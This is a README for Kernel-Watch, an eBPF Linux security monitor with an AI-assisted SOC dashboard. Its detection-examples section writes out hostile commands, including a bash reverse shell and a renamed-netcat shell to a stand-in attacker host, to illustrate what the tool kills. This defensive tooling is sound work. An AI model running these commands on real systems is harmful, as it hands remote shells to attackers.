<div align="center">

# 🛡️ Kernel-Watch

### Real-Time eBPF-Based Linux Security Monitoring with AI-Powered Threat Analysis

[![Linux](https://img.shields.io/badge/Platform-Linux-yellow?logo=linux&logoColor=white)](https://kernel.org)
[![eBPF](https://img.shields.io/badge/Powered%20by-eBPF-orange)](https://ebpf.io)
[![Node.js](https://img.shields.io/badge/Backend-Node.js-green?logo=node.js)](https://nodejs.org)
[![React](https://img.shields.io/badge/Frontend-React-blue?logo=react)](https://react.dev)
[![AI](https://img.shields.io/badge/AI-Groq%20Llama%203.3-purple)](https://groq.com)
[![License: MIT](https://img.shields.io/badge/License-MIT-brightgreen.svg)](LICENSE)

**Kernel-Watch** intercepts system calls at the kernel level using eBPF, instantly kills malicious processes, analyzes threats with AI, and streams everything to a real-time SOC dashboard.

---

</div>

## ✨ Features

| Feature | Description |
|---------|-------------|
| 🔬 **eBPF Kernel Probes** | Intercepts `execve`, `tcp_v4_connect`, and `memfd_create` syscalls with sub-millisecond latency |
| ⚡ **Instant Response** | Automatically `SIGKILL`s reverse shells, `/tmp` executions, and fileless malware |
| 🤖 **AI Threat Analysis** | Groq Llama 3.3 70B provides contextual risk assessment for every suspicious event |
| 🖥️ **SOC Dashboard** | Cyberpunk-themed React UI with live event streaming, filtering, and drill-down |
| 🗺️ **GeoIP World Map** | Visualizes network connections on an interactive map |
| 📋 **Forensic History** | Paginated search, export (JSON/CSV), and full audit trail in SQLite |
| 🔒 **Dynamic Whitelist** | Add or remove trusted processes at runtime — no restart required |
| 🧬 **Binary Hash Detection** | Catches renamed malware via SHA-256 fingerprinting (e.g., `nc` renamed to `updater`) |

---

## 🏗️ Architecture

```
┌──────────────────┐       ┌────────────────────┐       ┌──────────────────────┐
│   KERNEL LAYER   │       │    BACKEND LAYER   │       │   FRONTEND LAYER     │
│                  │       │                    │       │                      │
│  monitor.c       │       │  server.js         │       │  React + Vite        │
│  (eBPF probes)   │──────▶│  (Express + SQLite)│──────▶│  (SOC Dashboard)     │
│                  │       │                    │       │                      │
│  watcher.py      │ HTTP  │  Groq AI Engine    │  WS   │  Live Events         │
│  (BCC loader)    │ POST  │  WebSocket Server  │       │  History & Export    │
└──────────────────┘       └────────────────────┘       └──────────────────────┘
```

**Data Flow:** Kernel syscall → eBPF probe → Python watcher → Node.js backend → AI analysis → WebSocket → React dashboard

---

## 🚀 Getting Started

### Prerequisites

- **Linux** with kernel 4.15+ (Ubuntu/Debian/Kali recommended)
- **Root access** (eBPF requires `sudo`)
- **Node.js** 18+
- **Python 3** with BCC (BPF Compiler Collection)

### 1. Clone the Repository

```bash
git clone https://github.com/uchihashahin01/kernal-watch.git
cd kernal-watch
```

### 2. Install System Dependencies

```bash
# Installs bpfcc-tools, linux-headers, python3-bpfcc, libbpf-dev
./setup_env.sh
```

### 3. Install Application Dependencies

```bash
# Backend
cd backend && npm install && cd ..

# Frontend
cd frontend && npm install && cd ..
```

### 4. Configure Environment

Create a `.env` file in the `backend/` directory:

```env
GROQ_API_KEY=your_groq_api_key_here
```

> Get a free API key at [console.groq.com](https://console.groq.com)

### 5. Launch Everything

```bash
./start_all.sh
```

### 6. Open the Dashboard

Navigate to **http://localhost:5173** in your browser.

---

## 📜 `start_all.sh` — Master Startup Script

The [`start_all.sh`](start_all.sh) script is the single command to boot the entire security suite. It handles orchestration of all three layers in the correct order:

```
./start_all.sh
```

**What it does, step by step:**

| Step | Action | Details |
|------|--------|---------|
| **Pre-flight** | Dependency check | Verifies `node_modules` exist for both backend and frontend |
| **[1/3]** | Start Node.js Backend | Launches `server.js` on port `3000` (REST API + WebSocket + SQLite) |
| **[2/3]** | Start React Frontend | Launches Vite dev server on port `5173` with `--host` for network access |
| **[3/3]** | Start eBPF Watcher | Prompts for `sudo`, compiles `monitor.c`, attaches kernel probes |

**Shutdown:** Press `Ctrl+C` — the script traps `SIGINT`/`SIGTERM` and cleanly kills all child processes.

> **Note:** The eBPF watcher runs in the foreground with `sudo`. When it exits, the cleanup function automatically stops the backend and frontend.

---

## 🔍 What Gets Monitored

### Syscall Interception

| Syscall | What It Catches | Response |
|---------|----------------|----------|
| `execve` | Process execution, `/tmp` binaries, reverse shell lineage | SIGKILL on critical threats |
| `tcp_v4_connect` | Outbound network connections, suspicious ports | Flag + AI analysis |
| `memfd_create` | Fileless malware (in-memory execution) | SIGKILL if from network service |

### Threat Detection Examples

```bash
# Reverse Shell — KILLED
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Fileless Malware — KILLED
python3 -c "import ctypes; ctypes.CDLL(None).memfd_create(b'payload', 0)"

# Execution from /tmp — KILLED
chmod +x /tmp/backdoor && /tmp/backdoor

# Renamed netcat — FLAGGED
cp /usr/bin/nc /tmp/system-updater && /tmp/system-updater -e /bin/sh attacker.com 9999
```

---

## 🧪 Threat Test Suite

A comprehensive test suite validates detection capabilities:

```bash
cd threat_tests
sudo python3 run_all_tests.py
```

**Results: 24/26 threats detected — 92.3% detection rate**

| Category | Tests | Status |
|----------|-------|--------|
| Reverse Shell Attacks | 4 | ✅ Detected |
| Fileless Malware | 4 | ✅ Detected |
| LOLBins (Living off the Land) | 4 | ✅ Detected |
| Renamed Binaries | 4 | ✅ Detected |
| Privilege Escalation | 4 | ✅ Detected |
| Persistence Mechanisms | 6 | ✅ Detected |

---

## 📡 API Reference

The backend exposes a REST API on port `3000`:

| Method | Endpoint | Description |
|--------|----------|-------------|
| `POST` | `/api/ingest` | Receive events from the eBPF watcher |
| `GET` | `/api/history` | Paginated event history (`?page`, `?limit`, `?severity`, `?type`) |
| `GET` | `/api/stats` | Live statistics (counts by type/severity) |
| `GET` | `/api/threats` | Recent threat log |
| `GET/POST` | `/api/whitelist` | View or manage the dynamic whitelist |
| `GET` | `/api/export/threats` | Export threats as JSON |
| `GET` | `/api/export/history` | Export full history as CSV |

---

## 📁 Project Structure

```
kernel-watch/
├── monitor.c              # eBPF C program — kernel probes
├── watcher.py             # Python BCC loader — compiles & attaches eBPF
├── start_all.sh           # Master startup script
├── setup_env.sh           # System dependency installer
├── requirements.txt       # Python dependencies
│
├── backend/
│   ├── server.js          # Node.js backend (Express + SQLite + Groq AI + Socket.IO)
│   └── package.json
│
├── frontend/
│   └── src/
│       ├── App.jsx            # App entry point
│       ├── Dashboard.jsx      # Main SOC dashboard
│       ├── History.jsx        # Forensic history with export
│       ├── WhitelistConfig.jsx # Dynamic whitelist management
│       ├── WorldMap.jsx       # GeoIP network visualization
│       └── index.css          # Cyberpunk theme (~2100 lines)
│
├── threat_tests/          # Automated threat detection test suite
│   ├── run_all_tests.py
│   └── scripts/           # Individual test scripts
│
├── Raw Testing/           # Manual attack simulation scripts
├── SYSTEM_ARCHITECTURE.md # Full technical documentation
└── project_paper.md       # Research paper & design notes
```

---

## 🛠️ Tech Stack

| Layer | Technology | Purpose |
|-------|-----------|---------|
| Kernel | C + eBPF | Syscall interception via kprobes |
| Agent | Python + BCC | eBPF compiler & event relay |
| Backend | Node.js + Express | REST API, event processing |
| Database | SQLite (WAL mode) | Persistent forensic storage |
| AI | Groq Llama 3.3 70B | Threat analysis & risk scoring |
| Real-time | Socket.IO | WebSocket event broadcasting |
| Frontend | React + Vite | SOC dashboard UI |
| Visualization | Recharts + react-simple-maps | Charts & GeoIP world map |

---

## ⚠️ Requirements

- Linux kernel 4.15 or later
- Root/sudo privileges for eBPF
- Ubuntu, Debian, or Kali (for automated setup)
- Node.js 18+, Python 3.8+
- Groq API key (free tier available)

---

## 📄 License

This project is licensed under the [MIT License](LICENSE).
